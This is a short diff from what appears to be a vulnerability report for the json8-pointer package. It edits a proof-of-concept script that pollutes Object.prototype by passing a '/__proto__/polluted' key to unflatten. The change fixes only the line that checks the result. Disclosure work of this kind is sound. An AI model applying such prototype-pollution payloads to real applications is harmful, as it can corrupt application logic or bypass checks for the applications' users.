@@ -12,7 +12,7 @@ This package allowing for modification of prototype behavior, which may result i
 // poc.js
 var json8Pointer = require("json8-pointer")
 json8Pointer.unflatten({"": {},"/firstName": "John", "/__proto__/polluted": "Yes! Its Polluted"});
-console.log(polluted); 
+console.log({}.polluted); 
 ```
 
 2. Execute the following commands in another terminal:
